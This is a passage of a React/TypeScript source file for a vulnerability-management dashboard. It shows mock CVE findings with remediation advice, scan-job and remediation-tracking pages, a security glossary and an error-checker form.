    cisaKev: true,
  },
  {
    cve: 'CVE-2023-4863',
    title: 'libwebp Heap Buffer Overflow in WebP Rendering',
    cvss: 8.8,
    epss: 92.1,
    severity: 'HIGH',
    asset: 'public-landing-cdn',
    status: 'MITIGATED',
    sla: '4d remaining',
    description: 'OOB write in libwebp Huffman table construction allows attackers to achieve sandbox escape via malicious WebP images.',
    remediation: 'Upgrade libwebp to version 1.3.2+ across image transform pipelines and enforce edge WAF image format inspection.',
    cisaKev: true,
  },
  {
    cve: 'CVE-2023-38545',
    title: 'curl SOCKS5 Hostname Heap Buffer Overflow',
    cvss: 9.8,
    epss: 75.4,
    severity: 'HIGH',
    asset: 'auth-service-pod-prod',
    status: 'IN PROGRESS',
    sla: '5d remaining',
    description: 'Buffer overflow in SOCKS5 proxy handshake when curl switches to local hostname resolution on overly long hostnames (>255 bytes).',
    remediation: 'Upgrade libcurl / curl packages to 8.4.0 or later; avoid using socks5h:// configurations with untrusted URLs.',
    cisaKev: false,
  },
  {
    cve: 'CVE-2022-22965',
    title: 'Spring Framework RCE via Data Binding (Spring4Shell)',
    cvss: 9.8,
    epss: 96.0,
    severity: 'CRITICAL',
    asset: 'api-gateway.bytecodx.internal',
    status: 'RESOLVED',
    sla: 'Closed',
    description: 'Remote code execution via class loader manipulation when running Spring MVC on Tomcat via WAR deployment.',
    remediation: 'Upgrade Spring Framework to 5.3.18+ or 5.2.20+ and ensure standard JAR containerized deployments.',
    cisaKev: true,
  },
  {
    cve: 'CVE-2024-27351',
    title: 'Django Regex String Evaluation Denial of Service',
    cvss: 5.3,
    epss: 21.0,
    severity: 'MEDIUM',
    asset: 'staging-payment-mock',
    status: 'ACCEPTED RISK',
    sla: 'Accepted',
    description: 'Regular expression catastrophe in django.utils.text.Truncator allows remote denial of service via repetitive character inputs.',
    remediation: 'Upgrade Django to 4.2.11 / 5.0.3 or apply bounded regex input limits.',
    cisaKev: false,
  },
  {
    cve: 'CVE-2023-44487',
    title: 'HTTP/2 Rapid Reset Protocol Vulnerability (DDoS)',
    cvss: 7.5,
    epss: 84.6,
    severity: 'HIGH',
    asset: 'api-gateway.bytecodx.internal',
    status: 'MITIGATED',
    sla: '2d remaining',
    description: 'RST_STREAM abuse allowing concurrent stream cancellation floods that overwhelm reverse proxy web servers.',
    remediation: 'Configure SETTINGS_MAX_CONCURRENT_STREAMS=100 and rate limit TCP RST packets per client IP.',
    cisaKev: true,
  },
  {
    cve: 'CVE-2023-4911',
    title: 'GNU C Library ld.so Looney Tunables Buffer Overflow',
    cvss: 7.8,
    epss: 62.3,
    severity: 'HIGH',
    asset: 'k8s-ingress-controller',
    status: 'PATCH STAGED',
    sla: '3d remaining',
    description: 'Buffer overflow in the GLIBC dynamic loader processing the GLIBC_TUNABLES environment variable leading to root escalation.',
    remediation: 'Update glibc package on host nodes and rebuild base container images.',
    cisaKev: true,
  },
]

function VulnerabilitiesPage({ onNavigate }: { onNavigate: (page: string) => void }) {
  const [vulns] = useState<Vulnerability[]>(INITIAL_VULNS)
  const [search, setSearch] = useState('')
  const [filterSeverity, setFilterSeverity] = useState('ALL')
  const [activeVuln, setActiveVuln] = useState<Vulnerability | null>(null)

  const filtered = vulns.filter((v) => {
    const matchSearch = v.cve.toLowerCase().includes(search.toLowerCase()) || v.title.toLowerCase().includes(search.toLowerCase()) || v.asset.toLowerCase().includes(search.toLowerCase())
    const matchSev = filterSeverity === 'ALL' || v.severity === filterSeverity || (filterSeverity === 'RESOLVED' && v.status === 'RESOLVED')
    return matchSearch && matchSev
  })

  return (
    <section className="module-page">
      <div className="eyebrow"><span className="eyebrow-line" /> VULNERABILITY FINDINGS</div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: '14px 0 20px' }}>
        <div>
          <h1>Verified Vulnerability Findings</h1>
          <p style={{ margin: 0, color: 'var(--muted)', fontSize: '11px' }}>
            Telemetry correlated with CVSS v3.1, FIRST EPSS exploit likelihood, and CISA KEV feeds.
          </p>
        </div>
      </div>

      <div className="panel" style={{ padding: '16px' }}>
        <div className="filter-bar">
          <div className="search-input-wrap">
            <Search size={14} color="var(--muted)" />
            <input
              placeholder="Search CVE, title, or asset..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
            />
          </div>
          <div className="chip-group">
            {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'RESOLVED'].map((s) => (
              <button
                key={s}
                className={`filter-chip ${filterSeverity === s ? 'active' : ''}`}
                onClick={() => setFilterSeverity(s)}
                type="button"
              >
                {s}
              </button>
            ))}
          </div>
        </div>

        <div className="table-container">
          <table className="content-table">
            <thead>
              <tr>
                <th>Vulnerability / CVE</th>
                <th>CVSS / EPSS</th>
                <th>Affected Asset</th>
                <th>CISA KEV</th>
                <th>SLA Due</th>
                <th>Status</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {filtered.map((v) => (
                <tr key={v.cve}>
                  <td>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <span className={`severity-badge ${v.severity.toLowerCase()}`}>{v.severity}</span>
                      <strong>{v.cve}</strong>
                    </div>
                    <div style={{ fontSize: '10px', color: 'var(--muted)', marginTop: '2px' }}>{v.title}</div>
                  </td>
                  <td>
                    <div style={{ fontFamily: 'monospace', fontWeight: 600 }}>{v.cvss.toFixed(1)}</div>
                    <div style={{ fontSize: '9px', color: 'var(--muted)', fontFamily: 'monospace' }}>EPSS: {v.epss}%</div>
                  </td>
                  <td>
                    <span style={{ fontFamily: 'monospace', fontSize: '10px' }}>{v.asset}</span>
                  </td>
                  <td>
                    {v.cisaKev ? (
                      <span className="status-badge critical" style={{ fontSize: '7px' }}>EXPLOITED</span>
                    ) : (
                      <span style={{ color: 'var(--muted)', fontSize: '9px' }}>None</span>
                    )}
                  </td>
                  <td>
                    <span className={`sla-indicator ${v.sla.includes('h remaining') ? 'urgent' : ''}`}>
                      <Clock size={11} /> {v.sla}
                    </span>
                  </td>
                  <td>
                    <span className={`status-badge ${v.status.toLowerCase().replace(' ', '-')}`}>
                      {v.status}
                    </span>
                  </td>
                  <td>
                    <button className="primary-button" style={{ padding: '6px 9px', fontSize: '9px' }} onClick={() => setActiveVuln(v)} type="button">
                      Details
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {activeVuln && (
        <div className="detail-modal-overlay" onClick={() => setActiveVuln(null)}>
          <div className="detail-modal-card" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span className={`severity-badge ${activeVuln.severity.toLowerCase()}`}>{activeVuln.severity}</span>
                <h2>{activeVuln.cve} - {activeVuln.title}</h2>
              </div>
              <button className="icon-button" onClick={() => setActiveVuln(null)} type="button">✕</button>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px', padding: '12px', background: 'var(--soft)', borderRadius: '8px', marginBottom: '14px' }}>
              <div><small style={{ color: 'var(--muted)' }}>CVSS 3.1 BASE</small><p style={{ margin: 0, fontWeight: 700, fontSize: '16px' }}>{activeVuln.cvss}</p></div>
              <div><small style={{ color: 'var(--muted)' }}>EPSS LIKELIHOOD</small><p style={{ margin: 0, fontWeight: 700, fontSize: '16px' }}>{activeVuln.epss}%</p></div>
              <div><small style={{ color: 'var(--muted)' }}>CISA KEV EXPLOIT</small><p style={{ margin: 0, fontWeight: 700, fontSize: '16px' }}>{activeVuln.cisaKev ? 'YES' : 'NO'}</p></div>
            </div>

            <div style={{ marginBottom: '14px' }}>
              <h3 style={{ fontSize: '12px', margin: '0 0 6px' }}>Vulnerability Description</h3>
              <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)', lineHeight: '1.6' }}>{activeVuln.description}</p>
            </div>

            <div style={{ marginBottom: '16px' }}>
              <h3 style={{ fontSize: '12px', margin: '0 0 6px' }}>Recommended Remediation</h3>
              <div style={{ padding: '10px', border: '1px solid var(--line)', borderRadius: '6px', background: 'var(--panel)', fontSize: '11px', color: 'var(--ink)', lineHeight: '1.6' }}>
                {activeVuln.remediation}
              </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px' }}>
              <button className="primary-button" style={{ background: 'transparent', border: '1px solid var(--line)', color: 'var(--ink)' }} onClick={() => setActiveVuln(null)} type="button">
                Close
              </button>
              <button className="primary-button" onClick={() => { setActiveVuln(null); onNavigate('Overview'); }} type="button">
                <Sparkles size={13} /> Analyze in AI Assistant
              </button>
            </div>
          </div>
        </div>
      )}
    </section>
  )
}

/* ---------------- SCAN ACTIVITY PAGE ---------------- */
type ScanJob = {
  id: string
  name: string
  adapter: string
  target: string
  progress: number
  status: 'RUNNING' | 'COMPLETED' | 'SCHEDULED' | 'FAILED'
  lastRun: string
  findingsCount: string
}

const INITIAL_SCANS: ScanJob[] = [
  { id: 'scn-1', name: 'External Network Perimeter Port Audit', adapter: 'OpenVAS / Nmap', target: '10.0.1.0/24, *.bytecodx.internal', progress: 68, status: 'RUNNING', lastRun: 'In progress', findingsCount: '4 new' },
  { id: 'scn-2', name: 'Container Image & IaC Dependency Audit', adapter: 'Trivy Scanner', target: 'auth-service:v2.4 (prod)', progress: 100, status: 'COMPLETED', lastRun: '45m ago', findingsCount: '2 High, 1 Med' },
  { id: 'scn-3', name: 'Dynamic Web Application Security Test (DAST)', adapter: 'OWASP ZAP', target: 'https://app.bytecodx.local', progress: 100, status: 'COMPLETED', lastRun: '3h ago', findingsCount: '0 Critical, 3 Low' },
  { id: 'scn-4', name: 'Static Source Code Analysis (SAST)', adapter: 'Semgrep Engine', target: 'bytecodx/core @ main (45deb19)', progress: 100, status: 'COMPLETED', lastRun: '5h ago', findingsCount: '0 Defects' },
  { id: 'scn-5', name: 'Cloud Infrastructure Security Posture (CSPM)', adapter: 'Prowler / ScoutSuite', target: 'AWS Multi-Account / VPC', progress: 0, status: 'SCHEDULED', lastRun: 'Tomorrow 02:00 UTC', findingsCount: 'Pending' },
]

function ScanActivityPage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
  const [scans, setScans] = useState<ScanJob[]>(INITIAL_SCANS)
  const [launching, setLaunching] = useState(false)
  const [launchSuccess, setLaunchSuccess] = useState('')

  function handleTriggerScan() {
    setLaunching(true)
    setLaunchSuccess('')
    setTimeout(() => {
      const newScan: ScanJob = {
        id: 'scn-' + Date.now(),
        name: 'On-Demand Full Perimeter Vulnerability Audit',
        adapter: 'OpenVAS & Trivy Orchestrator',
        target: 'All 14 Registered Scope Assets',
        progress: 100,
        status: 'COMPLETED',
        lastRun: 'Just now',
        findingsCount: '0 New Threats',
      }
      setScans([newScan, ...scans])
      setLaunching(false)
      setLaunchSuccess('Scan completed successfully! Telemetry updated.')
    }, 1800)
  }

  return (
    <section className="module-page">
      <div className="eyebrow"><span className="eyebrow-line" /> SCAN OPERATIONS</div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: '14px 0 20px' }}>
        <div>
          <h1>Scanner Activity & Scheduled Jobs</h1>
          <p style={{ margin: 0, color: 'var(--muted)', fontSize: '11px' }}>
            Continuous vulnerability scanning across network, containers, codebases, and cloud.
          </p>
        </div>
        <button className="primary-button" disabled={launching} onClick={handleTriggerScan} type="button">
          {launching ? <RefreshCw className="spinning" size={14} /> : <Play size={14} />}
          {launching ? 'Executing scan pipeline…' : 'Trigger On-Demand Scan'}
        </button>
      </div>

      {launchSuccess && (
        <div style={{ padding: '10px 14px', background: '#eaf8ec', border: '1px solid #70bd5444', color: '#2e7d32', borderRadius: '6px', fontSize: '11px', marginBottom: '14px' }}>
          ✓ {launchSuccess}
        </div>
      )}

      <div className="card-grid">
        {scans.map((scan) => (
          <div className="scan-card" key={scan.id}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '8px' }}>
              <span className={`status-badge ${scan.status.toLowerCase()}`}>{scan.status}</span>
              <span style={{ fontSize: '9px', color: 'var(--muted)', fontFamily: 'monospace' }}>{scan.lastRun}</span>
            </div>
            <h3 style={{ margin: '0 0 6px', fontSize: '12px' }}>{scan.name}</h3>
            <p style={{ margin: '0 0 10px', fontSize: '10px', color: 'var(--muted)' }}>
              <strong>Engine:</strong> {scan.adapter}<br />
              <strong>Scope:</strong> {scan.target}
            </p>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '9px', color: 'var(--muted)' }}>
              <span>Progress</span>
              <span>{scan.progress}%</span>
            </div>
            <div className="progress-bar-wrap">
              <div
                className={`progress-bar-fill ${scan.status === 'RUNNING' ? 'scan-progress-active' : ''}`}
                style={{
                  width: `${scan.progress}%`,
                  background: scan.status === 'COMPLETED' ? '#5965ed' : scan.status === 'RUNNING' ? '#2e7d32' : '#8caee0',
                }}
              />
            </div>
            <div style={{ marginTop: '10px', paddingTop: '8px', borderTop: '1px solid var(--line)', display: 'flex', justifyContent: 'space-between', fontSize: '10px' }}>
              <span style={{ color: 'var(--muted)' }}>Detections:</span>
              <strong>{scan.findingsCount}</strong>
            </div>
          </div>
        ))}
      </div>
    </section>
  )
}

/* ---------------- REMEDIATION PAGE ---------------- */
type RemediationTask = {
  id: string
  title: string
  cve: string
  asset: string
  owner: string
  stage: 'IN REVIEW' | 'PATCH STAGED' | 'MITIGATED' | 'RESOLVED'
  deadline: string
  notes: string
}

const INITIAL_TASKS: RemediationTask[] = [
  { id: 'rem-1', title: 'Apply emergency cumulative rollup on Database Cluster', cve: 'CVE-2024-38077', asset: 'core-db-cluster-01', owner: 'DevOps Lead', stage: 'IN REVIEW', deadline: 'Due in 18 hours', notes: 'Patch staged in pre-production. Awaiting final change board approval.' },
  { id: 'rem-2', title: 'Registry patch validation on internal build agents', cve: 'CVE-2024-21413', asset: 'internal-build-runner', owner: 'System Admin', stage: 'PATCH STAGED', deadline: 'Due in 32 hours', notes: 'Testing package compatibility with existing build matrix.' },
  { id: 'rem-3', title: 'CDN edge WAF rule rejecting malformed WebP headers', cve: 'CVE-2023-4863', asset: 'public-landing-cdn', owner: 'NetSec Team', stage: 'MITIGATED', deadline: 'Due in 4 days', notes: 'Compensating control deployed at CloudFront edge while library updates.' },
  { id: 'rem-4', title: 'Enforce HTTP/2 concurrency streams limit on Gateway', cve: 'CVE-2023-44487', asset: 'api-gateway.bytecodx.internal', owner: 'Gateway Team', stage: 'MITIGATED', deadline: 'Due in 2 days', notes: 'Configured SETTINGS_MAX_CONCURRENT_STREAMS to 100.' },
  { id: 'rem-5', title: 'Upgrade Spring Framework to 5.3.18+', cve: 'CVE-2022-22965', asset: 'api-gateway.bytecodx.internal', owner: 'CloudOps', stage: 'RESOLVED', deadline: 'Closed', notes: 'Code upgraded, deployed to prod, verified clean via rescanning.' },
]

function RemediationPage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
  const [tasks, setTasks] = useState<RemediationTask[]>(INITIAL_TASKS)

  function toggleTaskStatus(id: string) {
    setTasks(tasks.map((t) => {
      if (t.id === id) {
        const nextStage = t.stage === 'IN REVIEW' ? 'PATCH STAGED' : t.stage === 'PATCH STAGED' ? 'MITIGATED' : t.stage === 'MITIGATED' ? 'RESOLVED' : 'IN REVIEW'
        return { ...t, stage: nextStage }
      }
      return t
    }))
  }

  return (
    <section className="module-page">
      <div className="eyebrow"><span className="eyebrow-line" /> REMEDIATION LIFECYCLE</div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: '14px 0 20px' }}>
        <div>
          <h1>Remediation & SLA Tracking</h1>
          <p style={{ margin: 0, color: 'var(--muted)', fontSize: '11px' }}>
            Prioritized treatment workflows: Patching, compensating mitigations, and human audit sign-off.
          </p>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '14px', marginBottom: '20px' }}>
        <div className="panel" style={{ padding: '14px' }}>
          <small style={{ color: 'var(--muted)', fontSize: '9px', fontWeight: 600 }}>CRITICAL SLA (&lt; 48 HRS)</small>
          <div style={{ fontSize: '20px', fontWeight: 700, margin: '6px 0 2px', color: '#2e7d32' }}>92% Compliant</div>
          <small style={{ color: 'var(--muted)', fontSize: '9px' }}>1 active emergency ticket</small>
        </div>
        <div className="panel" style={{ padding: '14px' }}>
          <small style={{ color: 'var(--muted)', fontSize: '9px', fontWeight: 600 }}>HIGH SLA (&lt; 7 DAYS)</small>
          <div style={{ fontSize: '20px', fontWeight: 700, margin: '6px 0 2px', color: '#1967d2' }}>95% Compliant</div>
          <small style={{ color: 'var(--muted)', fontSize: '9px' }}>3 tickets in active mitigation</small>
        </div>
        <div className="panel" style={{ padding: '14px' }}>
          <small style={{ color: 'var(--muted)', fontSize: '9px', fontWeight: 600 }}>MEAN TIME TO REMEDIATE (MTTR)</small>
          <div style={{ fontSize: '20px', fontWeight: 700, margin: '6px 0 2px', color: 'var(--ink)' }}>3.2 Days</div>
          <small style={{ color: 'var(--muted)', fontSize: '9px' }}>Ahead of 5.0 day target</small>
        </div>
      </div>

      <div className="panel" style={{ padding: '16px' }}>
        <h2 style={{ fontSize: '13px', marginBottom: '14px' }}>Active Remediation Pipeline</h2>
        <div style={{ display: 'grid', gap: '12px' }}>
          {tasks.map((task) => (
            <div key={task.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px', border: '1px solid var(--line)', borderRadius: '8px' }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px', maxWidth: '70%' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className={`status-badge ${task.stage.toLowerCase().replace(' ', '-')}`}>{task.stage}</span>
                  <strong style={{ fontSize: '11px' }}>{task.title}</strong>
                </div>
                <div style={{ fontSize: '10px', color: 'var(--muted)' }}>
                  <strong>CVE:</strong> {task.cve} · <strong>Asset:</strong> {task.asset} · <strong>Assignee:</strong> {task.owner}
                </div>
                <div style={{ fontSize: '9px', color: 'var(--ink)', background: 'var(--soft)', padding: '4px 6px', borderRadius: '4px', marginTop: '2px' }}>
                  {task.notes}
                </div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '6px' }}>
                <span className={`sla-indicator ${task.deadline.includes('hours') ? 'urgent' : ''}`}>
                  <Clock size={11} /> {task.deadline}
                </span>
                <button className="primary-button" style={{ padding: '5px 10px', fontSize: '9px' }} onClick={() => toggleTaskStatus(task.id)} type="button">
                  Advance Stage →
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>
    </section>
  )
}

/* ---------------- SECURITY GUIDES PAGE ---------------- */
function SecurityGuidesPage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
  const [tab, setTab] = useState<'lifecycle' | 'cvss' | 'glossary'>('lifecycle')
  const [glossarySearch, setGlossarySearch] = useState('')

  const GLOSSARY_TERMS = [
    { term: 'Attack Surface', def: 'The total sum of vulnerabilities, ports, protocols, and endpoints reachable and potentially exploitable by an adversary.' },
    { term: 'CVE (Common Vulnerabilities and Exposures)', def: 'A standardized dictionary of publicly known cybersecurity vulnerabilities and exposures maintained by MITRE.' },
    { term: 'CVSS (Common Vulnerability Scoring System)', def: 'An open framework for measuring the severity of software vulnerabilities on a scale from 0.0 to 10.0.' },
    { term: 'EPSS (Exploit Prediction Scoring System)', def: 'A data-driven machine learning model from FIRST that estimates the real-world probability a vulnerability will be exploited in the wild.' },
    { term: 'CISA KEV (Known Exploited Vulnerabilities)', def: 'The definitive catalog maintained by CISA of software flaws that have confirmed, active in-the-wild exploitation.' },
    { term: 'DAST (Dynamic Application Security Testing)', def: 'Black-box security testing analyzing a running application from the outside without access to source code.' },
    { term: 'SAST (Static Application Security Testing)', def: 'White-box static analysis analyzing source code or byte code for vulnerabilities without executing the program.' },
    { term: 'Zero-Day (0-Day)', def: 'A security vulnerability that is unknown to the software vendor or for which no official security patch currently exists.' },
    { term: 'Remediation vs Mitigation', def: 'Remediation permanently eliminates the flaw (e.g. patching code). Mitigation reduces exploit likelihood via compensating controls (e.g. WAF rules).' },
    { term: 'RCE (Remote Code Execution)', def: 'A critical vulnerability class allowing an adversary to execute arbitrary system commands on a remote host over a network.' },
  ]

  const filteredGlossary = GLOSSARY_TERMS.filter(
    (g) => g.term.toLowerCase().includes(glossarySearch.toLowerCase()) || g.def.toLowerCase().includes(glossarySearch.toLowerCase())
  )

  return (
    <section className="module-page">
      <div className="eyebrow"><span className="eyebrow-line" /> RESEARCH & GUIDES</div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', margin: '14px 0 20px' }}>
        <div>
          <h1>Security Engineering Knowledge Base</h1>
          <p style={{ margin: 0, color: 'var(--muted)', fontSize: '11px' }}>
            Comprehensive guide to the 5-phase vulnerability lifecycle, risk scoring, and terminology.
          </p>
        </div>
      </div>

      <div style={{ display: 'flex', gap: '8px', marginBottom: '16px' }}>
        <button className={`filter-chip ${tab === 'lifecycle' ? 'active' : ''}`} onClick={() => setTab('lifecycle')} type="button">
          5-Stage Lifecycle
        </button>
        <button className={`filter-chip ${tab === 'cvss' ? 'active' : ''}`} onClick={() => setTab('cvss')} type="button">
          CVSS & EPSS Scoring
        </button>
        <button className={`filter-chip ${tab === 'glossary' ? 'active' : ''}`} onClick={() => setTab('glossary')} type="button">
          Cybersecurity Glossary
        </button>
      </div>

      {tab === 'lifecycle' && (
        <div className="panel" style={{ padding: '20px' }}>
          <h2>The 5 Operational Stages of Vulnerability Management</h2>
          <p style={{ color: 'var(--muted)', fontSize: '11px', lineHeight: '1.6' }}>
            Effective vulnerability management is continuous and cyclical. Below are the core operational stages required for enterprise defense:
          </p>
          <div className="workflow-grid" style={{ marginTop: '16px' }}>
            {[
              { step: '01', title: 'Assess & Discover', desc: 'Continuously identify all network-accessible assets, open ports, software dependencies, and cloud endpoints.' },
              { step: '02', title: 'Prioritize Contextually', desc: 'Correlate findings against CVSS base score, business asset criticality, and real-world EPSS/KEV exploit data.' },
              { step: '03', title: 'Act & Treat', desc: 'Execute the agreed treatment path: permanent remediation (patching), compensating mitigation (WAF/ACLs), or risk acceptance.' },
              { step: '04', title: 'Reassess & Verify', desc: 'Re-run targeted vulnerability scans to independently verify that the applied patch or control effectively closes the vulnerability.' },
              { step: '05', title: 'Improve & Report', desc: 'Audit Mean Time to Remediate (MTTR), SLA compliance percentages, and refine scanner configurations to prevent recurrence.' },
            ].map((s) => (
              <div className="workflow-card" key={s.step}>
                <span className="workflow-step">STAGE {s.step}</span>
                <h3>{s.title}</h3>
                <p>{s.desc}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {tab === 'cvss' && (
        <div className="panel" style={{ padding: '20px' }}>
          <h2>Understanding Vulnerability Scoring: CVSS vs. EPSS</h2>
          <p style={{ color: 'var(--muted)', fontSize: '11px', lineHeight: '1.6' }}>
            Modern cybersecurity teams combine severity measurement with threat likelihood:
          </p>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginTop: '16px' }}>
            <div style={{ padding: '16px', border: '1px solid var(--line)', borderRadius: '8px' }}>
              <h3 style={{ fontSize: '13px', margin: '0 0 8px' }}>CVSS v3.1 (Severity Metric)</h3>
              <p style={{ fontSize: '11px', color: 'var(--muted)', lineHeight: '1.6' }}>
                Measures the intrinsic, technical attributes of a vulnerability. Evaluates:
              </p>
              <ul style={{ fontSize: '10px', color: 'var(--muted)', lineHeight: '1.6', paddingLeft: '18px' }}>
                <li><strong>Attack Vector:</strong> Network, Adjacent, Local, Physical</li>
                <li><strong>Attack Complexity:</strong> Low vs High</li>
                <li><strong>Privileges Required:</strong> None, Low, High</li>
                <li><strong>User Interaction:</strong> None vs Required</li>
                <li><strong>Impact Metrics:</strong> Confidentiality, Integrity, Availability</li>
              </ul>
            </div>
            <div style={{ padding: '16px', border: '1px solid var(--line)', borderRadius: '8px' }}>
              <h3 style={{ fontSize: '13px', margin: '0 0 8px' }}>FIRST EPSS (Probability Metric)</h3>
              <p style={{ fontSize: '11px', color: 'var(--muted)', lineHeight: '1.6' }}>
                Estimates the likelihood that a vulnerability will be actively exploited in the next 30 days:
              </p>
              <ul style={{ fontSize: '10px', color: 'var(--muted)', lineHeight: '1.6', paddingLeft: '18px' }}>
                <li>Data-driven AI model updated daily.</li>
                <li>Incorporates real-world honeypot, telemetry, and exploit availability feeds.</li>
                <li>Enables teams to fix high-probability flaws before widespread weaponization.</li>
                <li>Scores range from 0% (unlikely) to 100% (actively weaponized).</li>
              </ul>
            </div>
          </div>
        </div>
      )}

      {tab === 'glossary' && (
        <div className="panel" style={{ padding: '20px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
            <h2>Cybersecurity Terms Glossary</h2>
            <div className="search-input-wrap" style={{ minWidth: '200px' }}>
              <Search size={13} color="var(--muted)" />
              <input
                placeholder="Search glossary terms..."
                value={glossarySearch}
                onChange={(e) => setGlossarySearch(e.target.value)}
              />
            </div>
          </div>
          <div style={{ display: 'grid', gap: '10px' }}>
            {filteredGlossary.map((item) => (
              <div key={item.term} style={{ padding: '12px', border: '1px solid var(--line)', borderRadius: '6px' }}>
                <strong style={{ fontSize: '12px', color: '#5965ed' }}>{item.term}</strong>
                <p style={{ margin: '4px 0 0', fontSize: '11px', color: 'var(--ink)', lineHeight: '1.5' }}>{item.def}</p>
              </div>
            ))}
          </div>
        </div>
      )}
    </section>
  )
}

/* ---------------- ERROR CHECKER PAGE ---------------- */
function ErrorCheckerPage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
  const reduceMotion = useReducedMotion() ?? false
  const [targetType, setTargetType] = useState<'website' | 'software' | 'stack-trace'>('website')
  const [input, setInput] = useState('https://example.com/login')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [result, setResult] = useState<DiagnosticResponse | null>(null)
  const primaryFinding = result?.findings[0] ?? null

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setError('')
    const value = input.trim()
    if (!value) {
      setError('Please provide an address, text snippet, or stack trace.')
      return
    }

    setLoading(true)
    try {
      const response = await analyzeDiagnostic({ targetType, input: value })
      setResult(response)
    } catch (requestError) {
      setError(requestError instanceof Error ? requestError.message : 'The diagnostic check failed.')
    } finally {
      setLoading(false)
    }
  }

  function applyPreset(nextType: 'website' | 'software' | 'stack-trace', nextInput: string) {
    setTargetType(nextType)
    setInput(nextInput)
    setResult(null)
    setError('')
  }

  return (
    <section className="module-page error-checker-page">
      <div className="eyebrow"><span className="eyebrow-line" /> HEURISTIC DIAGNOSTICS</div>
      <motion.div
        className="module-hero"
        initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: reduceMotion ? 0 : 0.3 }}
      >
        <span className="module-icon"><Shield size={22} /></span>
        <div>
          <h1>Error checker & instant diagnosis</h1>
          <p>Analyze web endpoints, runtime errors, or software traces to get actionable security findings and fix instructions.</p>
        </div>
      </motion.div>

      <div className="error-checker-grid">
        <form className="panel checker-form" onSubmit={handleSubmit}>
          <div className="checker-types" role="radiogroup" aria-label="Diagnostic target type">
            {[
              { id: 'website', label: 'Website / URL' },
              { id: 'software', label: 'Software / code' },
              { id: 'stack-trace', label: 'Stack trace' },
            ].map((option) => (
              <button
                key={option.id}
                className={`type-chip${targetType === option.id ? ' selected' : ''}`}
                onClick={() => setTargetType(option.id as any)}
                type="button"
              >
                {option.label}
              </button>
            ))}
          </div>

          <label className="checker-input-label">
            <span>
              {targetType === 'website' ? 'Target address' : targetType === 'software' ? 'Source or configuration text' : 'Stack trace or error log'}
            </span>
            {targetType === 'website' ? (
              <input
                className="checker-text-input"
                onChange={(event) => setInput(event.target.value)}
                placeholder="https://example.com/login"
                required
                value={input}
              />
            ) : (
              <textarea
                className="checker-textarea"
                onChange={(event) => setInput(event.target.value)}
                placeholder={targetType === 'software' ? 'Paste code, config, or package manifest here…' : 'Paste stack trace, log line, or exception text here…'}
                required
                rows={6}
                value={input}
              />
            )}
          </label>

          <div className="checker-actions">
            <div className="preset-links">
              <span>Try:</span>
              <button onClick={() => applyPreset('website', 'http://localhost:5001/api/v1/health')} type="button">Local health URL</button>
              <button onClick={() => applyPreset('software', 'TypeError: Cannot read properties of undefined (reading \'length\')')} type="button">TypeError sample</button>
              <button onClick={() => applyPreset('stack-trace', 'java.lang.NullPointerException: Cannot invoke method because target is null')} type="button">Java NPE sample</button>
            </div>
            <button className="primary-button checker-submit" disabled={loading} type="submit">
              {loading ? <RefreshCw className="spinning" size={14} /> : <Sparkles size={14} />}
              {loading ? 'Analyzing…' : 'Run check'}
            </button>
          </div>
          {error && <p className="checker-error" role="alert">{error}</p>}
        </form>

        <div className="panel checker-summary-card">
          <p className="panel-kicker">ASSESSMENT SUMMARY</p>
          <h2>{result ? result.summary : 'Awaiting diagnostic input'}</h2>
          <div className="checker-score-block">
            <span className="score-number">{result ? result.score : '—'}</span>
            <span className="score-label">Health score / 100</span>
          </div>
          <p className="checker-score-note">
            Higher scores indicate clean inputs; lower scores suggest critical syntax, connection, or permission issues.
          </p>
        </div>
      </div>

      {result && (
        <section className="diagnostic-result panel" aria-live="polite">
          <div className="diagnostic-summary-row">
            <strong>Target: {result.targetType}</strong>
            <span className={`status-badge ${result.status.toLowerCase()}`}>{result.status}</span>
          </div>

          {primaryFinding && (
            <div className="diagnostic-alert-card">
              <div className="diagnostic-alert-head">
                <span className={`severity-badge ${primaryFinding.severity.toLowerCase()}`}>{primaryFinding.severity}</span>
                <strong>PRIMARY DIAGNOSIS</strong>
              </div>
              <h3>{primaryFinding.title}</h3>
